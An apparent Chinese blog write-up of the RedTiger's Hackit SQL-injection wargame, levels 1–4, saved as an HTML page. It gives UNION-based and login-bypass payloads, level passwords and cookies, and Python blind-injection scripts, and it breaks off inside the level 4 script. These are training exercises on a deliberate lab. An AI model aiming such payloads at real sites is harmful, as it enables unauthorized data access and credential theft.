@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RedTiger&#39;s Hackit writeup">
+<meta property="og:url" content="http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-04-04T00:52:34.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.881Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/","path":"2018/04/04/RedTiger-s-Hackit-writeup/","title":"RedTiger's Hackit writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>RedTiger's Hackit writeup | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redtiger"><span class="nav-number">1.</span> <span class="nav-text">RedTiger</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">1.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">1.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">1.5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-6"><span class="nav-number">1.6.</span> <span class="nav-text">level 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-7"><span class="nav-number">1.7.</span> <span class="nav-text">level 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8"><span class="nav-number">1.8.</span> <span class="nav-text">level 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-9"><span class="nav-number">1.9.</span> <span class="nav-text">level 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-10"><span class="nav-number">1.10.</span> <span class="nav-text">level 10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%BD%91%E7%AB%99"><span class="nav-number">1.11.</span> <span class="nav-text">参考网站</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="RedTiger's Hackit writeup | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RedTiger's Hackit writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-04-04 08:52:34" itemprop="dateCreated datePublished" datetime="2018-04-04T08:52:34+08:00">2018-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。
+<span id="more"></span></p>
+<h1 id="redtiger"><a
+target="_blank" rel="noopener" href="http://redtiger.labs.overthewire.org">RedTiger</a></h1>
+<h2 id="level1">level1</h2>
+<p>点击Category：1后，网址以GET方式传递<code>cat</code>参数。 -
+利用<code>and 1=1</code>,<code>and 1=2</code>进行判断是否存在注入点：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常 </span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 </span><br><span class="line"># 运行异常</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2 </span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>存在数字型注入，利用order by 测试出存在4个列：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常 </span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 </span><br><span class="line"># 运行异常</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5 </span><br></pre></td></tr></table></figure></p></li>
+<li><p>构造union联合查询语句，找回显： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 </span><br></pre></td></tr></table></figure> 发现3,4
+处存在回显。</p></li>
+</ul>
+<p>我这里继续爆库、爆表、爆字段等操作，发现异常。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()</span><br></pre></td></tr></table></figure> 回显</p>
+<pre><code>    5.5.57-0+deb8u1
+    hackit</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;level1_users&#x27;</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<pre><code>    Some things are disabled!!!</code></pre>
+<p>所以无法找出<code>level1_users</code>的字段了吗？
+当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为</p>
+<pre><code>查询字符串
+    cat:1
+表单数据
+    user:
+    password:
+    login:login</code></pre>
+<p>开始试了试 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users</span><br></pre></td></tr></table></figure>
+结果不对，而我观察到页面中给出的是<code>username</code>，所以换成它。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users</span><br><span class="line"></span><br></pre></td></tr></table></figure> got it.拿到用户名密码后登录即可。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hornoxe</span><br><span class="line">thatwaseasy</span><br></pre></td></tr></table></figure></p>
+<h2 id="level2">level2</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level2.php&quot; -H &quot;Cookie: level2login=4_is_not_random&quot; </span><br></pre></td></tr></table></figure>
+<p>首先点击登陆按钮，抓取登陆数据包。有如下字段</p>
+<pre><code>username=admin&amp;password=admin&amp;login=Login</code></pre>
+<p>先对<code>username</code>进行注入点测试，并尝试万能用户名。无果而返。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;</span><br><span class="line">admin&#x27; --+</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/*</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1%23</span><br><span class="line">admin&#x27;)or(&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure> 接着对password测试： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br></pre></td></tr></table></figure>
+但是得到的返回信息为：</p>
+<pre><code>&lt;b&gt;Warning&lt;/b&gt;:  mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/    hackit/level2.php&lt;/b&gt; on line &lt;b&gt;48&lt;/b&gt;&lt;br /&gt;
+Login incorrect!</code></pre>
+<p>说明存在字符型注入点。这就好办了。直接上sql万能密码
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></p>
+<h2 id="level3">level3</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level3.php&quot; -H &quot;Cookie: level3login=feed_your_cat_before_your_cat_feeds_you&quot; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Admin&#x27;</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0</span><br><span class="line">Admin&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM3</span><br><span class="line">Admin&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM4</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Admin&#x27; order by 8#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMxMDY2 # 报错</span><br><span class="line">Admin&#x27; order by 7#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2 # 不报错</span><br></pre></td></tr></table></figure>
+<p>显示位还显示的Admin的信息，那找个数据库中没有的显示。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Admin&#x27; union select 1,2,3,4,5,6,7#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDc3MjA0MTA0MTc4MTQ2MDA5MTg4MDI2MDA5MTg2MDAyMjMzMDc0MDYwMTk5MjM3MjE5MDg3MjQ2MTU0MjA4MTc2MDk2MTMxMjIwMDUxMDU5</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max&#x27; union select 1,2,3,4,5,6,7#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTMwMjEx</span><br></pre></td></tr></table></figure>
+<p>得到的回显位为：2,4,5,6,7。</p>
+<pre><code>Show userdetails: &lt;br&gt;
+                &lt;table style=&quot;border-collapse:collapse; border:1px solid black;&quot;&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Username: &lt;/td&gt;
+                        &lt;td&gt;2&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;First name: &lt;/td&gt;
+                        &lt;td&gt;6&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Name: &lt;/td&gt;
+                        &lt;td&gt;7&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;ICQ: &lt;/td&gt;
+                        &lt;td&gt;5&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Email: &lt;/td&gt;
+                        &lt;td&gt;4&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/table&gt;    
+            &lt;br&gt;&lt;br&gt;&lt;br&gt;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># max&#x27; union select 1,2,3,4,5,6,(column_name) from information_schema.columns where table_name=&#x27;level3_users&#x27; limit 0,1#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTU3MTQ3MTA3MTE2MTY1MTM5MjA0MTQ0MTEyMDM3MTg5MTUzMTA0MjE4MTcwMTc4MDE1MTk4MDAyMTUxMTIwMDg2MTMzMTMyMDY5MDQ3MTY0MTkwMDM3MDU2MTI0MTQwMDM2MDc5MTI1MTIyMTExMTQ5MTMyMDY2MTQ3MjA1MDcxMDQ3MTkzMjE0MTE3MTIzMTk5MDg3MTE5MTUzMDMzMTU3MjA1MDE3MDQ3MjIzMDU4MjQ0MTg3MDI5MTY4MDU4MjA0MjAzMDY2MjAyMDA1MDQ3MTMxMDI4MTY3MDk4MjE2MjQ0MjE3MTQwMjQ2MjAxMTg4MTk3MDQ2MDA3MTUzMDM3MTQ4MjA4</span><br></pre></td></tr></table></figure>
+<p>尝试暴列名出错。</p>
+<pre><code>Show userdetails: &lt;br&gt;Some things are disabled!!!</code></pre>
+<p>还好知道字段，<code>password</code>，直接泄露即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># max&#x27; union select 1,2,3,4,5,6,password from level3_users where username=&#x27;Admin&#x27;#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTk3MTQ1MTE5MTA3MTY3MTM3MjA4MTcxMDYyMDM0MTYyMTQ3MDQ0MjE4MTYwMTY1MDIyMjA2MDc4MjA1MDczMDY5MTUzMTQ3MDkwMDYxMjQwMTYwMDM0MDUxMDgxMTU0MTAzMDgyMTA3MTE0MTI0MjEzMTM0MDY0MTU0MTMzMDEzMDAwMjE0MTU1MTA3MTI1MTMzMDA2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">thisisaverysecurepasswordEEE5rt</span><br></pre></td></tr></table></figure>
+<p>代码可以写作： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$payload2 =&quot;max&#x27; union select 1,2,3,4,5,6,password from level3_users where username=&#x27;Admin&#x27;#&quot;;</span><br><span class="line">print_r($payload2);</span><br><span class="line">print &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">$en_payload = encrypt($payload2);</span><br><span class="line">print_r($en_payload);</span><br><span class="line">print &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h2 id="level4">level4</h2>
+<p>网站 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level4.php&quot; -H &quot;Cookie: level4login=there_is_no_bug&quot;</span><br></pre></td></tr></table></figure></p>
+<pre><code>Welcome to Level 4
+
+Target: Get the value of the first entry in table level4_secret in column keyword
+Disabled: like</code></pre>
+<p>从<code>table_leel4</code>表中的<code>keyword</code>列得到第一个值。
+这道题的提示是盲注。
+点击<code>Click me</code>，得到带有<code>?id=1</code>的新链接<code>https://redtiger.labs.overthewire.org/level4.php?id=1</code>。</p>
+<p>正常页面显示<code>Query returned 1 rows.</code>。
+注入<code>'</code>，新页面显示<code>Query returned 0 rows.</code>。说明这是错误结果。</p>
+<p>利用<code>布尔盲注</code>，通过返回页面中<code>Query returned 1 rows.</code>的结果来筛选出目标结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(keyword,1,1)) from level4_secret limit 0,1)&lt;&#123;1&#125;</span><br></pre></td></tr></table></figure>
+<p>利用脚本来进行盲注很easy。但是需要提前把SQL语句测试准确，以免带来额外的调试。</p>
+<p>先获取值的长度，再逐个获取字符。这里采用折半搜索。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url_length=&quot;http://redtiger.labs.overthewire.org/level4.php?id=1 and (select length(keyword) from level4_secret limit 0,1)&lt;&#123;0&#125;&quot;</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level2login&quot;:&quot;4_is_not_random&quot;,</span><br><span class="line">         &quot;level3login&quot;:&quot;feed_your_cat_before_your_cat_feeds_you&quot;,</span><br><span class="line">         &quot;level4login&quot;:&quot;there_is_no_bug&quot;</span><br><span class="line">        &#125;</span><br><span class="line">h=50</span><br><span class="line">l=1</span><br><span class="line">length=(l+h)/2</span><br><span class="line">while l &lt;= h:</span><br><span class="line">    url = url_length.format(length)</span><br><span class="line">    resp=requests.get(url, cookies=cookies)</span><br><span class="line">    if resp.status_code != 200:</span><br><span class="line">        print &quot;status code error &quot;</span><br><span class="line">    text = resp.content</span><br><span class="line">    if text.find(&#x27;Query returned 1 rows.&#x27;) != -1: </span><br><span class="line">        h = length-1</span><br><span class="line">    else:</span><br><span class="line">        l = length+1</span><br><span class="line">    length =(h+l)/2</span><br><span class="line"></span><br><span class="line">print &#x27;length = &#x27;, length</span><br></pre></td></tr></table></figure>
+<p>再进行逐个字符测试。
+需要牢记的是ASCII字符集由95个可打印字符（<strong>0x20-0x7E</strong>）和33个控制字符（<strong>0x00-0x19，0x7F</strong>）组成。
+由于采取了折半搜索，需要根据返回结果来判断，得到的字符是否需要+1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url_format=&quot;http://redtiger.labs.overthewire.org/level4.php?id=1 and (select ascii(substr(keyword,&#123;0&#125;,1)) from level4_secret limit 0,1)&gt;&#123;1&#125;&quot;</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level2login&quot;:&quot;4_is_not_random&quot;,</span><br><span class="line">         &quot;level3login&quot;:&quot;feed_your_cat_before_your_cat_feeds_you&quot;,</span><br><span class="line">         &quot;level4login&quot;:&quot;there_is_no_bug&quot;</span><br><span class="line">        &#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1, 21+1):</span><br><span class="line">    print &quot;%d th round&quot;%(i)</span><br><span class="line">    h= 0x7E</span><br><span class="line">    l= 0x20</span><br><span class="line">    flag=0</span><br><span class="line">    while l &lt;= h:</span><br><span class="line">        c=(l+h)/2</span><br><span class="line">        #print &#x27;h=&#x27;, chr(h)</span><br><span class="line">        #print &#x27;l=&#x27;, chr(l)</span><br><span class="line">        #print &#x27;c=%d&#x27;%c</span><br><span class="line">        url = url_format.format(i,c)</span><br><span class="line">        #print url</span><br><span class="line">        resp=requests.get(url, cookies=cookies)</span><br><span class="line">        if resp.status_code != 200:</span><br><span class="line">            print &quot;status code error &quot;</span><br><span class="line">        text = resp.content</span><br><span class="line">        #print text</span><br><span class="line">        if text.find(&#x27;Query returned 1 rows.&#x27;) == -1:</span><br><span class="line">            h = c-1</span><br><span class="line">            flag=0</span><br><span class="line">        else:</span><br><span class="line">            l = c+1</span><br><span class="line">            flag=1</span><br><span class="line">    print &#x27;c=&#x27;,c,&#x27; flag=&#x27;, flag</span><br><span class="line">    if flag:</span><br><span class="line">        c+=1</span><br><span class="line">    print &#x27;found c = 